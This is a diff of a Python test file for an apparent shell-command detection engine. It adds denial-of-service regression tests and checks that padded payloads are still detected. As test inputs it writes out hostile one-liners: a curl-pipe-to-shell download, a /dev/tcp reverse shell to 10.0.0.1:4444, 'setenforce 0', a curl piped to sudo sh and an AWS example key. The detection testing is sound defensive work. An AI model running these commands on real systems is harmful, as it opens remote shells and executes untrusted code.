@@ -191,18 +191,51 @@ def test_load_rules_rejects_duplicate_ids(tmp_path):
         load_rules(dup_path)
 
 
-def test_match_rules_linear_time_on_adversarial_single_line_input():
-    """DoS regression (#14): superlinear backtracking on long single lines."""
+def _line(unit: str, target_len: int = 4000) -> str:
+    """A ~target_len-char line built by repeating ``unit``."""
+    return unit * max(1, target_len // len(unit))
+
+
+def test_match_rules_linear_time_on_adversarial_multiline_input():
+    """DoS regression (#14), round 2: {0,400}-bounded gaps alone are still
+    quadratic *within* one long line (a bounded gap can still be retried at
+    every occurrence of the next required token inside the bound). Each
+    shape is 250 lines x ~4000 chars of a rule's worst-case repeating token
+    (no closing token anywhere, forcing the full failure path); match_rules
+    must stay well under 2s per shape even at this ~1MB scale."""
     rules = list(RULES.values())
-    adversarial = [
-        "crontab " + "curl ;" * 33_000,
-        "python -c " + "socket " * 28_000,
-        "curl " + "a&&" * 66_000 + "chmod +x",
-        "wget " + ">>a" * 66_000 + "authorized_keys",
-        "b" * 200_000,
-    ]
-    start = time.monotonic()
-    for text in adversarial:
-        match_rules(text, rules)
-    elapsed = time.monotonic() - start
-    assert elapsed < 2.0, f"match_rules took {elapsed:.3f}s on adversarial input"
+    shapes = {
+        "authorized_keys_remote": _line("curl >> "),
+        "download_then_exec": _line("curl a&&"),
+        "cron_remote": "crontab " + _line("curl ;", 3990),
+        "python_reverse_shell": "python -c " + _line("socket ", 3990),
+    }
+    for rule_id, line in shapes.items():
+        text = "\n".join([line] * 250)
+        start = time.monotonic()
+        hits = {h.rule_id for h in match_rules(text, rules)}
+        elapsed = time.monotonic() - start
+        assert elapsed < 2.0, f"{rule_id} shape took {elapsed:.3f}s ({len(text)} chars)"
+        assert rule_id not in hits  # no closing token present -> never matches
+
+
+def test_long_line_padding_does_not_evade_detection():
+    """Regression (#14): match_rules() used to truncate each line to 4000
+    chars, so a payload placed after that point was silently skipped. There
+    is no line cap now; a payload far into a long line must still fire."""
+    pad = " " * 5000
+    rules = list(RULES.values())
+    cases = {
+        "curl_pipe_sh": pad + "curl http://x/a.sh | sh",
+        "dev_tcp_shell": pad + "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+        "setenforce_off": pad + "setenforce 0",
+        "aws_access_key_id": pad + "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
+    }
+    for rule_id, text in cases.items():
+        hits = {h.rule_id for h in match_rules(text, rules)}
+        assert rule_id in hits, rule_id
+
+
+def test_curl_pipe_sudo_with_argument_flagged():
+    hits = match_rules("#!/bin/bash\ncurl u | sudo -u root sh\n", list(RULES.values()))
+    assert "curl_pipe_sh" in {h.rule_id for h in hits}
